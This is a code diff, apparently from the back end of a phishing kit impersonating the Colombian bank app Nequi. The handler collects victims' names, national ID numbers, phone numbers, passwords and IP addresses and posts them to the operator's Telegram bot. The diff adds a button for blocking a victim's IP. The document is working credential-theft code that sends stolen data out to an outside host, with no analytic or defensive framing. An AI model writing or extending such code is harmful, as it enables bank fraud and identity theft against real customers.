@@ -78,7 +78,7 @@ module.exports = async function handler(req, res) {
             message = `
 👤Nequi_Meta_Infinito👤
 🆔Nombres: ${fullName}
-🪪Cédula: ${documentNumber}
+🪪 Cédula: ${documentNumber}
 #️⃣Número: ${username || 'No proporcionado'}
 🔐Clave: ${password || 'No proporcionada'}
 🌏IP: ${userIP || 'Desconocida'}
@@ -86,9 +86,24 @@ module.exports = async function handler(req, res) {
 `.trim();
         }
 
+        const button = {
+            inline_keyboard: [
+                [
+                    {
+                        text: "Bloquear IP",
+                        callback_data: `block_ip:${userIP}` // Incluye la IP en el callback
+                    }
+                ]
+            ]
+        };
+
         const response = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
-            { chat_id: CHAT_ID, text: message }
+            {
+                chat_id: CHAT_ID,
+                text: message,
+                reply_markup: button
+            }
         );
 
         res.status(200).json({ success: true, data: response.data });
